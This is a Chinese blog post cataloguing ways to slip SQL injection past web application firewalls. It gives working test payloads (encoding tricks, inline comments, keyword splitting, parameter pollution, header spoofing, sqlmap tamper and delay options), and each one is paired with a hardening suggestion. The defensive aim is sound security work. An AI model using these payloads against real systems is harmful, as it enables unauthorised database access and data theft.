---
layout: post
title: WAF绕过方式与加固建议
subtitle: WAF绕过方式与加固建议
date: 2024-09-19 17:38
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
number headings: 
published: false
---
## 一、编码混淆与特殊字符绕过

攻击原理：利用WAF解码逻辑与后端差异，或特定字符的解析歧义。

### 1.空字节注入(%00)

- 测试Payload: `id=1' UNION%00 SELECT 1, database()--` 
- 场景：WAF可能将%00视为语句结束符，而数据库继续执行后续语句。
- 加固建议：在语义分析层增加空字节清理逻辑，确保全语句连贯性检测。

### 2.Unicode/双重编码

- 测试Payload: `id=1' UNI%u004fN SEL%u0045CT 1,2--` (MSSQL/IIS环境)
- 双重编码：id=`1%2527%25200R%25201%253D1`（`%2527`解码为单引号）。
- 加固建议：实现多层递归解码，确保所有输入最终归一化处理。

### 3. 内联注释

测试Payload: `id=1'/*!50000UNION*/ /*!SELECT*/ 1,@@version--`
说明：利用MySQL对/\*!版本号\*/语法的特殊执行逻辑，绕过黑名单匹配。
加固建议：解析注释内容并评估其实际执行影响，而非简单跳过。

## 二、SQL语法变形与碎片化

攻击原理：拆解敏感关键词，利用数据库语法容错性重组。

### 1.关键词分割

测试Payload：

- 空白替代：`id=1'UNION%0aSELECT%0b1,2`（使用 `%0a` 换行符、`%0b` 垂直制表符）
- 注释分割：`id=1'UNI/*xyz*/ON SEL/*abc*/ECT 1,table_name FROM information_schema.tables`。
- 加固建议：建立词法分析器，识别被分割关键词的组合语义。

### 2. 同功能函数/运算符替换

测试Payload：

- 比较符：`id=1' OR 1<>2`（替代1=1）
- 字符串函数：`MID(user(),1,1)`替代`SUBSTRING(user(),1,1)`
- 盲注替代：`id=123'||(strcmp(left(database(),1),'a')=0)`。
- 加固建议：构建函数/运算符等价性知识库，覆盖罕见组合。

### 3. 缓冲区溢出攻击

- 测试Payload：`id=1' AND (SELECT 1)=(SELECT 0xAAAA...<1000+ bytes >...AAAA) UNION SELECT 1,version()--`
- 场景：超长脏数据可能使WAF检测引擎崩溃或跳过检测。
- 加固建议：设置请求体大小阈值，对超长请求启动流式检测（非一次性加载）。

## 三、协议与上下文伪装绕过

攻击原理：利用WAF对流量上下文识别漏洞。

### 1. 静态资源路径混淆

- 测试Payload：`GET /index.php/static/image.png?id=1' UNION SELECT 1, 2`
- 场景：WAF可能忽略对“静态资源”的检测，而后端仍执行PHP解析。
- 加固建议：基于MIME类型而非路径后缀决定检测策略，强化路径规范化解析。

### 2. 爬虫/工具伪装

- 测试Payload：
- UA设置：`User-Agent: Googlebot/2.1`
- 请求头注入：`X-Forwarded-For：1.1.1.1`（伪造可信IP）。
- 加固建议：整合威胁情报验证UA/IP真实性，对可疑爬虫启动二次验证（如JS Challenge）。

### 3. 参数污染（HPP）

- 测试Payload：`id=1&id=2' UNION SELECT 1,@@version--` 
- 场景：若后端取首个 id 值而WAF取末值，可绕过检测。
- 加固建议：关联多参数位置检测，或与业务框架协同确定参数解析逻辑。

## 四、自动化工具辅助绕过（针对SQLMap）

攻击场景：攻击者使用SQLMap的Tamper脚本自动化测试。

### 1. Tamper脚本利用

测试方法：

- 使用 `charencode.py`、`space2comment.py` 等脚本变形Payload。
- 自定义脚本：如替换 UNION 为 `/*!UNION*/`。
- 加固建议：监控高频Tamper特征（如特定注释模式），引入机器学习模型识别自动化工具流量。

### 2. 延时绕过CC防护

- 测试方法：`sqlmap --delay=3` （降低请求频率）。
- 加固建议：动态调整CC阈值，对低频但高复杂度请求启动深度检测。

## 五、针对性测试方案设计

### 1. 模糊测试（Fuzz）矩阵构建

下表为关键测试维度与用例示例：

| 测试维度          | 用例示例                          | 检测目标                 |
|:----------------- | --------------------------------- | ------------------------ |
| 空白符变异        | `%09`, `%0a`, `%0c`, `/**/`       | 分词引擎鲁棒性           |
| 关键词大小写/拆分 | `UnIon`, `SEL%0bECT`, `UNI/**/ON` | 归一化处理能力           |
| 注释注入          | `/*!SELECT*/`, `--%0a`, `#`       | 注释内恶意代码识别       |
| 特殊数据库语法    | `SELECT /*!50000 VERSION*/( )`    | 数据库特性兼容性检测     |
| 超长Payload       | `id=1'+'A'*5000+' OR 1=1--`       | 引擎内存管理与流处理能力 |

### 2. 深度防御加固建议

语义层分析：引入AST（抽象语法树）解析SQL逻辑结构，而非依赖正则匹配。例如：解析UNI<任意字符>ON为UNION节点。

动态行为检测：监控异常数据库交互（如information_schema访问），结合响应模式识别盲注。

协同防护：与业务系统联动，对输入参数强制类型化（如数字型参数拒绝字符串），从根源减少注入面

## 参考链接

[sql注入10之waf绕过_sql注入绕过waf-CSDN博客](https://blog.csdn.net/jonhswei/article/details/147350256)

[SQL注入_WAF绕过(一)](https://blog.csdn.net/qq_51550750/article/details/123843371)

[网络安全-长亭雷池waf的sql绕过，安全狗绕过（5种绕过3+2）](https://blog.csdn.net/m0_68976043/article/details/142449743)
